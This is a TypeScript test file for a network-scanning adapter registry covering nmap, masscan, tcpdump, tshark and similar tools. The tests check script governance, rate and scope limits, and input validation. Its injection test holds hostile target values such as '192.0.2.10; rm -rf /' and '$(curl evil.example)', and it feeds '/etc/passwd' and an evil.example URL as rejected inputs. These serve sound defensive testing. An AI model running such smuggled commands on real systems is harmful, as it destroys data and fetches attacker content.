import { describe, expect, it } from "vitest";
import { ToolRegistry } from "../registry/registry";
import { FixtureToolRunner } from "../recon/runner";
import {
  MasscanAdapter, NaabuAdapter, NetdiscoverAdapter, NmapAdapter, RustScanAdapter,
  TcpdumpCaptureAdapter, TsharkAnalysisAdapter,
} from "./adapters-network";
import { networkFixtureResponses } from "./fixtures-network";
import { createNetworkAdapters, networkHealthBySlug, registerNetworkAdapters, NETWORK_SLUGS } from "./registry";
import { NSE_SCRIPT_CATALOG, nmapScriptPolicy } from "./script-policy";

const CIDR = { type: "CIDR" as const, value: "192.0.2.0/24", host: "192.0.2.0" };
const IP = { type: "IP_ADDRESS" as const, value: "192.0.2.10", host: "192.0.2.10" };

describe("network adapter registration (§2/§10/§86)", () => {
  it("all 8 adapters register; capabilities resolve as designed", () => {
    const registry = new ToolRegistry();
    const adapters = registerNetworkAdapters(registry, new FixtureToolRunner());
    expect(adapters.map((a) => a.metadata.slug).sort()).toEqual([...NETWORK_SLUGS].sort());
    // HIGH_SPEED is its own capability so NO default stage can select masscan (§19)
    expect(registry.byCapability("HIGH_SPEED_PORT_DISCOVERY").map((a) => a.metadata.slug)).toEqual(["masscan"]);
    expect(registry.byCapability("LOCAL_NETWORK_DISCOVERY").map((a) => a.metadata.slug).sort()).toEqual(["arp-scan", "netdiscover"]);
    expect(registry.byCapability("PACKET_CAPTURE").map((a) => a.metadata.slug)).toEqual(["tcpdump"]);
    expect(registry.byCapability("PORT_DISCOVERY").map((a) => a.metadata.slug).sort()).toEqual(["naabu", "nmap", "rustscan"]);
    const masscan = adapters.find((a) => a.metadata.slug === "masscan")!;
    expect(masscan.metadata.requiresApproval).toBe(true);
    for (const a of adapters) {
      expect(a.metadata.riskLevel).not.toBe("RESTRICTED");
    }
  });

  it("health is honestly UNAVAILABLE when binaries are absent", () => {
    const health = networkHealthBySlug(createNetworkAdapters(new FixtureToolRunner()));
    for (const slug of NETWORK_SLUGS) expect(health[slug]).toBe("UNAVAILABLE");
  });
});

describe("NSE script governance (§14)", () => {
  it("selection can NEVER include INTRUSIVE or DISABLED scripts, even when approved", () => {
    const allIds = NSE_SCRIPT_CATALOG.map((s) => s.id);
    const { selected, excludedIntrusive, excludedDisabled } = nmapScriptPolicy.selectScripts(allIds);
    for (const s of selected) {
      expect(["SAFE", "REVIEW_REQUIRED"]).toContain(s.classification);
    }
    expect(selected.map((s) => s.id)).not.toContain("smb-vuln-ms17-010");
    expect(selected.map((s) => s.id)).not.toContain("ssh-brute");
    expect(selected.map((s) => s.id)).not.toContain("smb-psexec");
    expect(excludedIntrusive).toBeGreaterThan(0);
    expect(excludedDisabled).toBeGreaterThan(0);
  });
  it("unknown scripts classify REVIEW_REQUIRED, brute/exploit/dos categories DISABLED/INTRUSIVE", () => {
    expect(nmapScriptPolicy.classify("never-seen-script").classification).toBe("REVIEW_REQUIRED");
    expect(nmapScriptPolicy.classify("x", ["brute"]).classification).toBe("DISABLED");
    expect(nmapScriptPolicy.classify("x", ["vuln"]).classification).toBe("INTRUSIVE");
    expect(nmapScriptPolicy.classify("x", ["safe", "discovery"]).classification).toBe("REVIEW_REQUIRED");
  });
  it("the SAFE_CHECKS plan names scripts individually — never a category expression", async () => {
    const plan = await new NmapAdapter(new FixtureToolRunner()).buildExecutionPlan(CIDR, { scanMode: "SAFE_CHECKS" });
    const scriptArg = plan.arguments[plan.arguments.indexOf("--script") + 1]!;
    expect(scriptArg).toContain("banner");
    expect(scriptArg).not.toMatch(/default|vuln|brute|exploit|all/);
    expect(scriptArg).not.toContain("smb-vuln-ms17-010");
  });
});

describe("typed plan construction (§13/§82)", () => {
  it("nmap host discovery / service plans are built only from typed config", async () => {
    const adapter = new NmapAdapter(new FixtureToolRunner());
    const discovery = await adapter.buildExecutionPlan(CIDR, { scanMode: "HOST_DISCOVERY" });
    expect(discovery.arguments).toContain("-sn");
    expect(discovery.arguments).toContain("192.0.2.0/24");
    const service = await adapter.buildExecutionPlan(CIDR, { scanMode: "SERVICE", portProfile: "STANDARD", versionIntensity: 7 });
    expect(service.arguments).toContain("-sV");
    expect(service.arguments).toContain("--version-intensity");
    expect(service.arguments).toContain("7");
    const ports = await adapter.buildExecutionPlan(CIDR, { scanMode: "PORT_SCAN", udpScan: true });
    expect(ports.arguments).toContain("-sU");
  });

  it("forbidden config keys and hostile target tokens are rejected before any plan", async () => {
    const adapter = new NmapAdapter(new FixtureToolRunner());
    await expect(adapter.buildExecutionPlan(CIDR, { command: "nmap -sV" })).rejects.toThrow(/command/);
    await expect(adapter.buildExecutionPlan(CIDR, { scanMode: "PORT_SCAN", hosts: ["192.0.2.10; rm -rf /"] })).rejects.toThrow(/invalid network target/);
    await expect(adapter.buildExecutionPlan(CIDR, { scanMode: "PORT_SCAN", hosts: ["-sV"] })).rejects.toThrow(/invalid network target/);
    await expect(adapter.buildExecutionPlan(CIDR, { scanMode: "PORT_SCAN", hosts: ["$(curl evil.example)"] })).rejects.toThrow(/invalid network target/);
  });

  it("rustscan never emits the downstream-command passthrough separator (§18)", async () => {
    const plan = await new RustScanAdapter(new FixtureToolRunner()).buildExecutionPlan(CIDR, {});
    expect(plan.arguments).not.toContain("--");
    expect(plan.arguments.join(" ")).not.toMatch(/-sV|-A\b/);
  });

  it("masscan plans are rate-clamped and scope-size gated (§19/§20)", async () => {
    const adapter = new MasscanAdapter(new FixtureToolRunner());
    const plan = await adapter.buildExecutionPlan(IP, { maxRate: 50000 });
    const rate = Number(plan.arguments[plan.arguments.indexOf("--rate") + 1]);
    expect(rate).toBeLessThanOrEqual(10000);
    await expect(adapter.buildExecutionPlan({ type: "CIDR", value: "198.51.100.0/16", host: "198.51.100.0" }, {})).rejects.toThrow(/effective targets exceed/);
  });

  it("local discovery refuses non-CIDR targets (§21/§22)", async () => {
    const nd = new NetdiscoverAdapter(new FixtureToolRunner());
    await expect(nd.buildExecutionPlan({ type: "DOMAIN", value: "example.com", host: "example.com" }, {})).rejects.toThrow();
    const ok = await nd.buildExecutionPlan(CIDR, {});
    expect(ok.arguments).toContain("192.0.2.0/24");
  });

  it("tcpdump requires an explicit interface and bounds the capture (§44)", async () => {
    const td = new TcpdumpCaptureAdapter(new FixtureToolRunner());
    await expect(td.validateConfiguration({})).rejects.toThrow(/interface/);
    await expect(td.validateConfiguration({ interfaceName: "any" })).rejects.toThrow(/interface/);
    const plan = await td.buildExecutionPlan(CIDR, { interfaceName: "eth0", durationSeconds: 3600 });
    expect(plan.arguments).toContain("-G");
    const gIdx = plan.arguments.indexOf("-G");
    expect(Number(plan.arguments[gIdx + 1])).toBeLessThanOrEqual(300); // budget-clamped
    expect(plan.outputFiles).toEqual(["capture.pcap"]);
  });

  it("tshark accepts only object-storage capture references (§45)", async () => {
    const ts = new TsharkAnalysisAdapter(new FixtureToolRunner());
    await expect(ts.validateConfiguration({ captureArtifactRef: "/etc/passwd" })).rejects.toThrow(/reference/);
    await expect(ts.validateConfiguration({ captureArtifactRef: "https://evil.example/x.pcap" })).rejects.toThrow(/reference/);
    await expect(ts.validateConfiguration({ captureArtifactRef: "scans/scan-1/exec-2/raw-output.txt" })).resolves.toBeUndefined();
  });
});

describe("fixture lifecycle through the ToolRunner boundary", () => {
  it("nmap fixture: execute → parse → normalize yields assets, services, 3 governed findings", async () => {
    const adapter = new NmapAdapter(new FixtureToolRunner(networkFixtureResponses()));
    const plan = await adapter.buildExecutionPlan(CIDR, { scanMode: "SERVICE" });
    const { rawOutput } = await adapter.execute(plan);
    const parsed = await adapter.parse(rawOutput!);
    const result = await adapter.normalize(parsed);
    expect(result.assets.length).toBeGreaterThanOrEqual(3);
    expect(result.findings).toHaveLength(3);
    expect(result.services.some((s) => s.port === 443 && s.tls)).toBe(true);
  });

  it("naabu + tshark fixtures flow through the same lifecycle", async () => {
    const naabu = new NaabuAdapter(new FixtureToolRunner(networkFixtureResponses()));
    const nPlan = await naabu.buildExecutionPlan(CIDR, {});
    const nParsed = await naabu.parse((await naabu.execute(nPlan)).rawOutput!);
    const nResult = await naabu.normalize(nParsed);
    expect(nResult.services).toHaveLength(9);

    const tshark = new TsharkAnalysisAdapter(new FixtureToolRunner(networkFixtureResponses()));
    const tPlan = await tshark.buildExecutionPlan(CIDR, { captureArtifactRef: "scans/s1/e1/raw-output.txt" });
    const tParsed = await tshark.parse((await tshark.execute(tPlan)).rawOutput!);
    const tResult = await tshark.normalize(tParsed);
    expect(tResult.transactions).toHaveLength(2);
  });

  it("absent binaries fail honestly as UNAVAILABLE, never fabricated output", async () => {
    const adapter = new NmapAdapter(new FixtureToolRunner({}));
    const plan = await adapter.buildExecutionPlan(CIDR, { scanMode: "SERVICE" });
    await expect(adapter.execute(plan)).rejects.toThrow(/not available/);
  });
});
